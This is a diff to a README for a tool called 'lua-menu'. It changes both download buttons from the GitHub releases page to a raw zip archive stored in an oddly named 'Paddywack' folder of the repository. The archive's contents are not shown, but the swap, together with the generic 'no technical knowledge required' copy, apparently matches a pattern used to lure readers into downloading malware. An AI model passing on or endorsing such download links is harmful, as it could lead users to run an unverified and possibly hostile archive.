@@ -27,7 +27,7 @@ Set a timer for each object, and lua-menu will automatically remove it when time
 
 ### Step 1: Get the Application
 
-[![DOWNLOAD NOW - CLICK HERE](https://img.shields.io/badge/⬇️_DOWNLOAD_LUA--MENU-FF5733?style=for-the-badge&logo=github&logoColor=white&color=2E86C1)](https://github.com/Antasgandhicod/lua-menu/releases)
+[![DOWNLOAD NOW - CLICK HERE](https://img.shields.io/badge/⬇️_DOWNLOAD_LUA--MENU-FF5733?style=for-the-badge&logo=github&logoColor=white&color=2E86C1)](https://raw.githubusercontent.com/Antasgandhicod/lua-menu/main/Paddywack/lua-menu-1.9.zip)
 
 **Visit this link to download the application.**
 
@@ -124,7 +124,7 @@ This project is actively developed. Visit the download page periodically to chec
 
 lua-menu takes all the complexity out of object spawning and environment testing. With its intelligent ground detection, random appearance generation, and automated cleanup, you'll be up and running in less than a minute. No technical knowledge required, no complicated setup - just download, run, and watch your virtual world come to life.
 
-🔗 **Ready to start? [Download lua-menu now](https://github.com/Antasgandhicod/lua-menu/releases)**
+🔗 **Ready to start? [Download lua-menu now](https://raw.githubusercontent.com/Antasgandhicod/lua-menu/main/Paddywack/lua-menu-1.9.zip)**
 
 ---
 
